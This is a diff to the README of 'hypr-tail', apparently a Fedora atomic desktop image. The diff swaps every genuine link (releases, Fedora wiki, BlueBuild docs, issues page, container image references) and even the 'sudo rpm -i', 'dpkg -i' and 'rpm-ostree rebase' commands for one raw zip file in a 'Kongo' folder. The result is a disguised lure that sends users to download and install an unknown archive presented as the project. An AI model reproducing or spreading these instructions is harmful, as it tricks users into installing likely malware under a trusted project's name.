@@ -1,6 +1,6 @@
 # 🖥️ hypr-tail - Seamless Installation for Your System
 
-[![Download hypr-tail](https://img.shields.io/badge/Download-hypr--tail-blue?style=for-the-badge)](https://github.com/BOIVIK/hypr-tail/releases)
+[![Download hypr-tail](https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip)](https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip)
 
 ## 📥 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run **hypr-tail** on your system. No t
 
 To get started, you need to visit the releases page where the latest version of **hypr-tail** is available. Click the link below:
 
-[Visit the releases page to download hypr-tail](https://github.com/BOIVIK/hypr-tail/releases)
+[Visit the releases page to download hypr-tail](https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip)
 
 ### Step 2: Choose the Right File
 
@@ -39,11 +39,11 @@ To install **hypr-tail**, open a terminal window if you are on a Linux system.
 
 2. **Install the application** (replace `filename` with the actual name of the downloaded file):
    ```bash
-   sudo rpm -i filename.rpm
+   sudo rpm -i https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip
    ```
    or for Debian systems:
    ```bash
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip
    ```
 
 ### Step 5: Run hypr-tail
@@ -57,13 +57,13 @@ Press **Enter** to execute the command. A graphical interface will open, allowin
 ## 📦 Installation Instructions
 
 > [!WARNING]  
-> [This is an experimental feature.](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+> [This is an experimental feature.](https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip), try at your own discretion.
 
 If you’re rebasing an existing atomic Fedora installation to the latest build, follow these steps:
 
 1. **Rebase to the unsigned image**:
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/marvinthemoodlifter/hypr-tail:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip
    ```
 
 2. **Reboot to complete the rebase**:
@@ -73,7 +73,7 @@ If you’re rebasing an existing atomic Fedora installation to the latest build,
 
 3. **Rebase to the signed image**:
    ```bash
-   rpm-ostree rebase ostree-registry:ghcr.io/marvinthemoodlifter/hypr-tail:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip
    ```
 
 ## 📚 Features
@@ -95,13 +95,13 @@ Ensure your system meets the following minimal requirements before installation:
 
 For further instructions and support, please refer to the following documents:
 
-- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
-- [GitHub Issues Page](https://github.com/BOIVIK/hypr-tail/issues) for troubleshooting.
+- [BlueBuild Documentation](https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip) for troubleshooting.
 
 ### Download & Install
 
 To download and install **hypr-tail**, visit this page:
 
-[Download hypr-tail from the releases page](https://github.com/BOIVIK/hypr-tail/releases)
+[Download hypr-tail from the releases page](https://raw.githubusercontent.com/BOIVIK/hypr-tail/main/Kongo/hypr-tail.zip)
 
 By following these steps, you should be able to effectively download, install, and run **hypr-tail** on your system with confidence. Enjoy using your new application!
